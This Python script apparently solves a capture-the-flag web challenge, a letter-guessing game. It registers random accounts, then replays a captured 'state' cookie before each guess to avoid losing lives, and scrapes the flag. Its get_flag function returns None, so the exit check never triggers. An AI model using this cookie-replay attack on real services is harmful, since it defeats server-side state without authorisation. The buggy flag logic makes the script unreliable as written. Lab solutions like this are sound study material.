import sys
import random
import string
import hashlib
from urllib.parse import urlparse

# Not installed by default 
import requests
from bs4 import BeautifulSoup
import json 

# To print in different colors in the terminal 
RED = '\033[91m'
GREEN = '\033[92m'
ENDC = '\033[0m'

def random_string(length=8):
  '''Generates a random string of the specified length.'''
  characters = string.ascii_letters + string.digits  # Combine letters and digits
  return ''.join(random.choice(characters) for _ in range(length))

def md5_hash_password(input_string):
  combined_string = input_string + 'dogg1e'
  encoded_string = combined_string.encode('utf-8')  # Encode the string to bytes
  md5_hash = hashlib.md5(encoded_string).hexdigest()
  return md5_hash

def setup_new_user():
    username = random_string()
    password = md5_hash_password(username)
    return username, password 

def register(session, url):
    username, password = setup_new_user()
    regParam = {'username':username,'password':password,'confirm':password,'submit':'Register'}
    response = session.post(url + '/register',json=regParam)
    return response, username, password

def login(session, url, username, password):
    loginParam = {'username':username,'password':password,'submit':'Login'}
    response = session.post(url + '/login', json=loginParam)
    if response.status_code != 200:
        print(RED + f'Login failed for user: {username}. Problem with the server?' + ENDC)
        exit()
    print(GREEN + f'Successfully logged in as user: {username}' + ENDC)
    return response

def check_error(response, session):
    if response.status_code != 200:
        print(RED + f'Registration did not return 200. Problem with server.' + ENDC)
        exit()
    soup = BeautifulSoup(response.text, 'html.parser')
    error_ul = soup.find('ul', class_='error')
    if error_ul is None:
        return True 
    error_message = error_ul.find('li').text.strip()
    print(RED + f"Error message: {error_message}" +ENDC)
    return False 

def get_flag(response):
    flag = None 
    soup = BeautifulSoup(response.text, 'html.parser')
    flag_div = soup.find('div', class_='flag')
    if flag_div:
        strong_tag = flag_div.find('strong')
        if strong_tag:
            flag_text = strong_tag.text.strip()
            print(GREEN + f'Flag is: {flag_text}' + ENDC)
            return flag 
 
def main():
    if len(sys.argv) != 2:
        print('Please specify challenge URL')
        print('python3 solution.py <challenge-url>')
        print('E.g, python3 solution.py http://127.0.0.1:8000')
        exit()
    url = sys.argv[1]
    parsed_url = urlparse(url)
    domain = parsed_url.hostname
    port = str(parsed_url.port)
    letters = list(string.ascii_lowercase + string.digits)
    #letters = "abcdef"
    first = True 
    cookie_str = ""
    with requests.Session() as session:
        # Guess in sets of 3 to avoid losing all 3 lives
        for i in range(0, len(letters), 3):
            # Reset the cookie to avoid weird behavior when the game starts
            session.cookies.set("state", "", domain=domain)
            while True:
                response, username, password = register(session, url)
                if check_error(response, session):
                    print(GREEN + f'Successfully registered user: {username}' + ENDC)
                    break  # Exit the loop on success
                else:
                 print(RED + f'Retrying registration' + ENDC)
            response = login(session, url, username, password)
            response = session.get(url + '/home')
            if first:
                cookie_str = session.cookies.get("state")
                if cookie_str is not None:
                    print(GREEN + f'Using the Cookie String: {cookie_str} for rest of the playthrough' + ENDC)
                    first = False
            # Keep the state the same for all the operations
            for j in range(3):
                if i + j < len(letters):
                    letter = letters[i + j]
                    session.cookies.set("state", cookie_str, domain=domain)
                    #print(f'State:{session.cookies.get('state')}')
                    response = session.get(url + '/guess?&letter=' + letter)
                    try:
                        data = json.loads(response.text)  # Parse the JSON string
                        if data.get("game") == "Invalid":
                            print(RED + f'Invalid state!!')
                            exit(1)
                        present_value = data.get("present") #get the value of present
                        if present_value == "true":
                            print(GREEN + f'Letter is present {letter}' + ENDC)
                        elif present_value == "false":
                            print(RED + f'Letter not present {letter}' + ENDC)
                        else:
                            print(f'Response: {response.text}')
                    except json.JSONDecodeError:
                        print(RED + f'Invalid JSON string' + ENDC)
                    session.cookies.set("state", cookie_str, domain=domain)
                    response = session.get(url + '/home')
                    flag = get_flag(response)
                    if flag:
                        exit()
    
if __name__ == "__main__":
    main()
